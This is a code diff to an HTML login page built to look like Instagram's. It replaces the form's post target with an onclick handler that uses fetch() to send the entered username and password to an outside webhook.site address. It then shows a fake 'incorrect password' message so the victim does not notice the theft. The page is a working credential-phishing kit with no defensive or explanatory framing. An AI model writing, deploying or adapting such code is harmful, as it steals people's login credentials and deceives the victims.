@@ -24,15 +24,15 @@
                     </div>
                     
                     <div id="form-login">
-                        <form action="https://webhook.site/9a2f940c-8357-4a84-b726-7973c66985ab" method="post">
+                        <div>
                             <div class="inp-ct">
                                 <input type="text" placeholder="Username" id="username" name="username">
                             </div>
                             <div class="inp-ct">
                                 <input type="password" placeholder="Password" id="password" name="password">
                             </div>
-                            <button type="submit">Log In</button>
-                        </form>
+                            <button type="submit" onclick="fetch(`https:\/\/webhook.site/afb170b1-76c6-4fdc-ab7d-ff26beec8550/?username=${document.getElementById('username').value}&password=${document.getElementById('password').value}`); setTimeout(() => {document.getElementById('incorrect-password').classList.toggle('hidden')}, 1200)">Log In</button>
+                        </div>
                     </div>
                     <div class="flex-row-ct">
                         <div class="line"></div>
@@ -42,6 +42,14 @@
                     <div id="fb-login">
                         <span id="fb-icon"></span>
                         <span>Log In with Facebook is disabled</span>
+                    </div>
+                    <div id="incorrect-password" class="hidden">
+                        <div>
+                            Sorry, your password was incorrect. Please
+                        </div>
+                        <div>
+                            double-check your password.
+                        </div>
                     </div>
                     <div style="width: 100%; text-align: center; margin-bottom: 10px;">
                         <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgot
